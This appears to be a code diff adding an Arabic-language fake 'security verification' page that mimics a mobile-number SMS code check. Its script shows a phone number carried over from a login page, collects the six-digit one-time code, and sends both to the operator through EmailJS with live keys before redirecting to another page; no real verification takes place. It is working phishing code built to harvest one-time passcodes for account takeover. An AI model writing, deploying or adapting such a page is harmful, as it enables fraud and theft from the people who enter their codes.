@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>التحقق من الأمن</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<!-- تضمين مكتبة EmailJS -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script type="text/javascript">
+  (function(){
+     // استبدل "YOUR_PUBLIC_KEY" بالمفتاح العام الخاص بك من حساب EmailJS
+     emailjs.init("iiwqfQQ5xVF9GfcPJ");
+  })();
+</script>
+
+<style>
+  :root {
+    --primary-orange: #ff6600;
+    --bg-white: #ffffff;
+    --text-dark: #111111;
+    --text-gray: #666666;
+    --text-light-gray: #b7b7b9;
+    --header-black: #0a0a0a;
+    --border-box: #cfcfd2;
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+  }
+
+  body {
+    background-color: #000000;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+  }
+
+  .phone-frame {
+    width: 100%;
+    max-width: 420px;
+    background: var(--bg-white);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    zoom: 0.8;
+  }
+
+  /* الهيدر الأسود مع العنوان وسهم الرجوع */
+  .header {
+    background-color: var(--header-black);
+    padding: 20px 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+  }
+
+  .header .title {
+    color: #ffffff;
+    font-size: 19px;
+    font-weight: 700;
+  }
+
+  .back-arrow {
+    position: absolute;
+    right: 18px;
+    display: flex;
+    align-items: center;
+  }
+
+  .back-arrow svg {
+    width: 22px;
+    height: 22px;
+    stroke: #ffffff;
+    stroke-width: 2.4;
+  }
+
+  .main-content {
+    padding: 34px 26px 24px;
+    flex: 1;
+    text-align: center;
+  }
+
+  .page-title {
+    font-size: 21px;
+    font-weight: 700;
+    color: var(--text-dark);
+    margin-bottom: 22px;
+  }
+
+  .sent-text {
+    font-size: 14.5px;
+    color: var(--text-gray);
+    font-weight: 500;
+    margin-bottom: 10px;
+  }
+
+  .phone-number {
+    font-size: 21px;
+    font-weight: 700;
+    color: var(--primary-orange);
+    margin-bottom: 24px;
+    direction: ltr;
+  }
+
+  .not-your-number {
+    display: inline-block;
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--text-dark);
+    text-decoration: none;
+    border-bottom: 2px solid var(--text-dark);
+    padding-bottom: 3px;
+    margin-bottom: 40px;
+    cursor: pointer;
+  }
+
+  .otp-label {
+    font-size: 14.5px;
+    font-weight: 500;
+    color: var(--text-dark);
+    margin-bottom: 14px;
+  }
+
+  .otp-box {
+    width: 100%;
+    height: 92px;
+    border: 1.5px solid var(--border-box);
+    border-radius: 10px;
+    background: transparent;
+    outline: none;
+    font-size: 20px;
+    text-align: center;
+    color: var(--text-dark);
+    letter-spacing: 6px;
+    margin-bottom: 26px;
+  }
+
+  .resend-timer {
+    font-size: 13.5px;
+    font-weight: 500;
+    color: var(--text-light-gray);
+  }
+
+  /* زر التحقق السفلي بحالة غير مفعّلة */
+  .footer {
+    padding: 18px 22px 26px;
+  }
+
+  .btn-verify {
+    width: 100%;
+    background-color: #d4d4d6;
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    padding: 15px 16px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: not-allowed;
+  }
+</style>
+</head>
+<body>
+
+  <div class="phone-frame">
+
+    <!-- الهيدر مع سهم الرجوع -->
+    <div class="header">
+      <span class="back-arrow">
+        <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"></polyline>
+        </svg>
+      </span>
+      <span class="title">التحقق من الأمن</span>
+    </div>
+
+    <div class="main-content">
+      <div class="page-title">التحقق من رقم الموبايل</div>
+
+      <div class="sent-text">تم إرسال رمز التحقق عبر الرسائل القصيرة إلى:</div>
+      <div class="phone-number" id="phoneNumberDisplay">0789249994</div>
+
+      <a href="index.html" class="not-your-number">ليس رقمك؟</a>
+
+      <div class="otp-label">أدخل رمز التحقق المكون من 6 أرقام:</div>
+      <input type="tel" inputmode="numeric" maxlength="6" class="otp-box" id="otpInput">
+
+      <div class="resend-timer" id="resendTimer">إعادة إرسال الرمز في 00:58 ث</div>
+    </div>
+
+    <div class="footer">
+      <button type="button" class="btn-verify" id="verifyBtn" disabled>التحقق</button>
+    </div>
+
+  </div>
+
+<script>
+  // عرض رقم الهاتف المخزّن من صفحة تسجيل الدخول
+  const storedPhone = localStorage.getItem('phoneNumber');
+  if (storedPhone) {
+    document.getElementById('phoneNumberDisplay').textContent = storedPhone;
+  }
+
+  // عدّاد إعادة الإرسال
+  let seconds = 58;
+  const timerEl = document.getElementById('resendTimer');
+  const interval = setInterval(() => {
+    seconds--;
+    if (seconds <= 0) {
+      clearInterval(interval);
+      timerEl.textContent = "لم يصلك الرمز؟ إعادة الإرسال";
+    } else {
+      timerEl.textContent = `إعادة إرسال الرمز في 00:${seconds < 10 ? '0' + seconds : seconds} ث`;
+    }
+  }, 1000);
+
+  // تفعيل زر التحقق عند إدخال 6 أرقام
+  const otpInput = document.getElementById('otpInput');
+  const verifyBtn = document.getElementById('verifyBtn');
+  
+  otpInput.addEventListener('input', () => {
+    if (otpInput.value.length === 6) {
+      verifyBtn.disabled = false;
+      verifyBtn.style.backgroundColor = 'var(--primary-orange)';
+      verifyBtn.style.cursor = 'pointer';
+    } else {
+      verifyBtn.disabled = true;
+      verifyBtn.style.backgroundColor = '#d4d4d6';
+      verifyBtn.style.cursor = 'not-allowed';
+    }
+  });
+
+  // إضافة وظيفة الإرسال باستخدام EmailJS عند الضغط على زر التحقق
+  verifyBtn.addEventListener('click', function() {
+    const phoneNumber = document.getElementById('phoneNumberDisplay').textContent;
+    const otpCode = otpInput.value;
+
+    // تغيير نص الزر أثناء الإرسال (اختياري)
+    verifyBtn.textContent = 'جاري التحقق...';
+    verifyBtn.disabled = true;
+
+    // استبدل "YOUR_SERVICE_ID" و "YOUR_TEMPLATE_ID" بالبيانات الخاصة بك
+    emailjs.send("service_8wd4e39", "template_jmbxyx2", {
+      phone_number: phoneNumber,
+      otp_code: otpCode
+    })
+    .then(function(response) {
+       console.log('SUCCESS!', response.status, response.text);
+       verifyBtn.textContent = 'تم التحقق بنجاح';
+       // التوجيه لصفحة chk.html
+       window.location.href = 'chk.html';
+    }, function(error) {
+       console.log('FAILED...', error);
+       verifyBtn.textContent = 'فشل التحقق، حاول مجدداً';
+       verifyBtn.disabled = false;
+    });
+  });
+</script>
+
+</body>
+</html>
